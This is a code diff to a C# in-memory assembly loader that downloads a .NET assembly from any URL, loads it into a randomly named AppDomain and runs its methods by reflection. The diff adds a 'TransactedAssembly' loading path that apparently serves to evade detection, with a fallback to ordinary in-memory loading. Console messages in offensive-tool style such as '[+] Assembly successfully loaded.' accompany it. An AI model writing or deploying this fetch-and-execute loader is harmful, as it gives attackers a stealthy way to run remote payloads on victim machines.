@@ -16,9 +16,9 @@ namespace Domains
             domains = new Dictionary<string, AppDomain>();
         }
 
-        public void loadAssembly(string url, string method)
+        public void loadAssembly(string url, string method, string name)
         {
-            Loader.CreateDomAndLoadAssembly(url, out Loader loader, out AppDomain dom, out string name);
+            Loader.CreateDomAndLoadAssembly(url, out Loader loader, out AppDomain dom, ref name);
             if (!assemblies.ContainsKey(name))
             {
                 assemblies.Add(name, loader);
@@ -69,10 +69,22 @@ namespace Domains
     {
         public Assembly ass = null;
 
-        private void LoadAssembly(string url, out string aName)
+        private void LoadAssembly(string url, ref string aName)
         {
             byte[] buffer = new System.Net.WebClient().DownloadData(url);
-            ass = TransactedAssembly.Load(buffer);//Assembly.Load(buffer);
+            try
+            {
+                ass = TransactedAssembly.Load(buffer, aName);
+            }
+            catch
+            {
+                Console.WriteLine("[X] Error parsing header structure. Falling to regular in memory assembly load.");
+                ass = Assembly.Load(buffer);
+                if (ass != null)
+                    Console.WriteLine("[+] Assembly successfully loaded.");
+            }
+
+
             if (ass.GetModules().Length == 1)
                 aName = ass.GetModules()[0].ScopeName;
             else
@@ -81,8 +93,7 @@ namespace Domains
         }
         private void Execute(string method, string[] parameters)
         {
-            //var modules = a.GetModules();
-            // IntPtr address = Marshal.GetHINSTANCE(modules[0]);
+
             Assembly assembly = ass;
             Type[] types = assembly.GetTypes();
             MethodInfo m = null;
@@ -125,12 +136,12 @@ namespace Domains
             const string chars = "abcdefghijklmnopqrstuvwxyz";
             return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
         }
-        public static void CreateDomAndLoadAssembly(string url, out Loader loader, out AppDomain dom, out string aName)
+        public static void CreateDomAndLoadAssembly(string url, out Loader loader, out AppDomain dom, ref string aName)
         {
             string name = randomString();
             dom = AppDomain.CreateDomain(name);
             loader = (Loader)dom.CreateInstanceAndUnwrap(Assembly.GetExecutingAssembly().FullName, typeof(Loader).FullName);
-            loader.LoadAssembly(url, out aName);
+            loader.LoadAssembly(url, ref aName);
         }
 
         public static void ExecuteMethod( Loader ld, string method, params string[] parameters)
